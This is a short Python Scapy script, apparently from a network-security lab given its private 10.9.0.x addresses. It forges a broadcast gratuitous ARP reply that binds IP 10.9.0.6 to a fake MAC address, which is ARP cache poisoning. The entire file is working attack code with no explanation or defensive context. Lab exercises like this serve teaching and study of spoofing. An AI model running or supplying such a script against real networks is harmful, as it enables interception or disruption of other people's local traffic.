
#!/usr/bin/env python3
from scapy.all import *
IP_B= "10.9.0.6"
IP_T= "10.9.0.105"

MAC_T_fake = "aa:bb:cc:dd:ee:ff"

# Constructing Gratuitous ARP packet
ether = Ether (src = MAC_T_fake, dst = "ff:ff:ff:ff:ff:ff")
arp = ARP (psrc = IP_B, hwsrc = MAC_T_fake, pdst = IP_B, hwdst= "ff:ff:ff:ff:ff:ff")
arp.op = 2 # Reply

frame = ether/arp 
sendp(frame)
